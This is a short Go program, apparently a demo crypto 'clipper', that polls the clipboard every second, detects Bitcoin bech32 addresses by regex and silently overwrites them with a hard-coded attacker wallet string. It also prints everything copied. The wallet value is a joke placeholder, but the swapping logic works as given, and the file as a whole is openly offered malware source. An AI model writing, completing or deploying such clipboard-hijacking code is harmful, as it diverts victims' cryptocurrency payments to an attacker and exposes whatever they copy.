package main

import (
"fmt"
"time"
"regexp"
"github.com/atotto/clipboard"
)

func main(){

var lastClipboard string

fmt.Println("waiting for new data")
btcPattern:= regexp.MustCompile("^bc1[a-zA-Z0-9]{25,39}$")
	for {
		text, err:=clipboard.ReadAll()
		if err!=nil{
			time.Sleep(1*time.Second)
		}
	if btcPattern.MatchString(text) {
            fmt.Println("get bitcoin wallet")
            
            hackerWallet := "bc1_HACKER_WALLET_1337_MONEY_GIMME_CRYPTO"
            

            clipboard.WriteAll(hackerWallet)
            

            lastClipboard = hackerWallet 
        } else {
            fmt.Println("got it:", text)
            lastClipboard = text
        }
		if text != "" && text != lastClipboard {
			fmt.Println("got it", text)
			lastClipboard = text
		}
	time.Sleep(1*time.Second)
	}

}


